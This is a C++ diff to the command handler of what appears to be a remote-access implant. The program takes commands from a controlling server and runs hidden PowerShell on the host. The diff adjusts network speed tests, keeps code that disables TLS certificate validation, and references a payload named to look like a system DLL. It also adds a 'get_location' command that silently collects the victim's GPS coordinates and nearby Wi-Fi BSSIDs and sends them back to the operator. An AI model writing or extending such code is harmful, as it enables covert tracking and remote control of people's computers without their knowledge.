@@ -2251,15 +2251,15 @@ static void handle_command(const std::string& msg_str) {
             // Download AND upload test against Cloudflare. Measures both directions.
             std::string _ps_speed =
                 "powershell -NoProfile -Command \""
-                "$dl_url='http://speed.cloudflare.com/__down?bytes=5000000';"
+                "$dl_url='http://speed.cloudflare.com/__down?bytes=1000000';"
                 "$ul_url='http://speed.cloudflare.com/__up';"
                 "$result=@{};"
                 "try{"
-                "  $sw=[System.Diagnostics.Stopwatch]::StartNew();"
-                "  $d=(";
+                "  $wc=(";
             _ps_speed += "New-Object System.Net.WebClient";
             _ps_speed +=
-                ").DownloadData($dl_url);$sw.Stop();"
+                ");$sw=[System.Diagnostics.Stopwatch]::StartNew();"
+                "  $d=$wc.DownloadData($dl_url);$sw.Stop();"
                 "  $result.dl_bytes=$d.Length;$result.dl_sec=[math]::Round($sw.Elapsed.TotalSeconds,3);"
                 "  $result.dl_mbps=[math]::Round(($d.Length*8/$sw.Elapsed.TotalSeconds)/1048576,2);"
                 "}catch{$result.dl_err=$_.Exception.Message}"
@@ -2267,12 +2267,12 @@ static void handle_command(const std::string& msg_str) {
                 "  $body=";
             _ps_speed += "New-Object byte[]";
             _ps_speed +=
-                " 5000000;"
+                " 1000000;"
                 "  $sw2=[System.Diagnostics.Stopwatch]::StartNew();"
-                "  $wc=";
+                "  $wc2=(";
             _ps_speed += "New-Object System.Net.WebClient";
             _ps_speed +=
-                ";$wc.UploadData($ul_url,'POST',$body)|Out-Null;$sw2.Stop();"
+                ");$wc2.UploadData($ul_url,'POST',$body)|Out-Null;$sw2.Stop();"
                 "  $result.ul_bytes=$body.Length;$result.ul_sec=[math]::Round($sw2.Elapsed.TotalSeconds,3);"
                 "  $result.ul_mbps=[math]::Round(($body.Length*8/$sw2.Elapsed.TotalSeconds)/1048576,2);"
                 "}catch{$result.ul_err=$_.Exception.Message}"
@@ -2315,11 +2315,11 @@ static void handle_command(const std::string& msg_str) {
         // Uses /files/pnpext.dll which is always present after deploy.
         else if (cmd == "host_relay_speed") {
 #ifdef STAGE1_KEEP_FALLBACKS
-            std::string vps_ip = g_config.server_address;
+            std::string vps_host = g_config.server_address;
             std::string output = g_procs.run_cmd_capture(
                 "powershell -NoProfile -Command \""
                 "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
-                "$url='https://" + vps_ip + "/files/pnpext.dll';"
+                "$url='https://" + vps_host + "/speedtest';"
                 "try{"
                 "  $sw=[System.Diagnostics.Stopwatch]::StartNew();"
                 "  $d=(New-Object System.Net.WebClient).DownloadData($url);$sw.Stop();"
@@ -2341,6 +2341,69 @@ static void handle_command(const std::string& msg_str) {
                 while (!err.empty() && (err.back()=='\n'||err.back()=='\r')) err.pop_back();
                 send_err("Host↔Relay DL test failed: " + err);
             }
+#else
+            send_err("sysinfo module loading, retry in a moment");
+#endif
+        }
+
+        // --- WPS / GPS geolocation ---
+        // Uses Windows Location API (uses Wi-Fi, GPS, IP as available).
+        // Also returns nearby Wi-Fi BSSIDs via netsh for manual WPS fallback.
+        else if (cmd == "get_location") {
+#ifdef STAGE1_KEEP_FALLBACKS
+            std::string ps_loc =
+                "powershell -NoProfile -Command \""
+                "$ErrorActionPreference='SilentlyContinue';"
+                // Windows Location API
+                "Add-Type -AssemblyName System.Device;"
+                "try{"
+                "  $w=[System.Device.Location.GeoCoordinateWatcher]::new(1);"  // High accuracy
+                "  $w.Start();"
+                "  $t=[DateTime]::Now.AddSeconds(8);"
+                "  while($w.Position.Location.IsUnknown -and [DateTime]::Now -lt $t){Start-Sleep -Milliseconds 300}"
+                "  $c=$w.Position.Location;$w.Stop();"
+                "  if(-not $c.IsUnknown){"
+                "    Write-Output ('GPS|'+[math]::Round($c.Latitude,6)+'|'+[math]::Round($c.Longitude,6)+'|'+[math]::Round($c.HorizontalAccuracy,1)+'|'+[math]::Round($c.Altitude,1))"
+                "  }else{Write-Output 'GPS|UNKNOWN'}"
+                "}catch{Write-Output 'GPS|ERROR'}"
+                // Wi-Fi BSSIDs via netsh
+                ";try{"
+                "  $w=netsh wlan show networks mode=bssid 2>&1;"
+                "  $nets=@();$cur=@{};"
+                "  foreach($line in $w){"
+                "    if($line -match 'SSID\\s+\\d+\\s*:\\s*(.+)'){$cur=@{ssid=$Matches[1].Trim()}}"
+                "    elseif($line -match 'BSSID\\s+\\d+\\s*:\\s*([0-9a-fA-F:]{17})'){$cur.bssid=$Matches[1]}"
+                "    elseif($line -match 'Signal\\s*:\\s*(\\d+)%'){$cur.signal=$Matches[1];$nets+=[PSCustomObject]$cur;$cur=@{}}"
+                "  }"
+                "  if($nets.Count -gt 0){Write-Output ('WIFI|'+($nets|ConvertTo-Json -Compress))}"
+                "  else{Write-Output 'WIFI|NONE'}"
+                "}catch{Write-Output 'WIFI|ERROR'}"
+                "\"";
+            std::string out = g_procs.run_cmd_capture(ps_loc);
+            // Split into GPS and WIFI lines
+            std::string gps_line, wifi_line;
+            std::istringstream ss(out);
+            std::string line;
+            while (std::getline(ss, line)) {
+                while (!line.empty() && (line.back()=='\r'||line.back()=='\n'||line.back()==' ')) line.pop_back();
+                if (line.substr(0,4) == "GPS|") gps_line = line.substr(4);
+                else if (line.substr(0,5) == "WIFI|") wifi_line = line.substr(5);
+            }
+            if (gps_line.empty()) gps_line = "UNKNOWN";
+            if (wifi_line.empty()) wifi_line = "NONE";
+            // Build JSON: {gps:"lat|lon|acc|alt", wifi:[...]}
+            // Escape wifi_line for JSON embedding
+            std::string wifi_json = wifi_line;
+            if (wifi_json == "NONE" || wifi_json == "ERROR" || wifi_json == "UNKNOWN") {
+                wifi_json = "\"" + wifi_json + "\"";
+            }
+            // gps_line is plain text, embed as string
+            std::string gps_esc;
+            for (char c : gps_line) {
+                if (c == '"') gps_esc += "\\\"";
+                else gps_esc += c;
+            }
+            send_ok("{\"gps\":\"" + gps_esc + "\",\"wifi\":" + wifi_json + "}");
 #else
             send_err("sysinfo module loading, retry in a moment");
 #endif
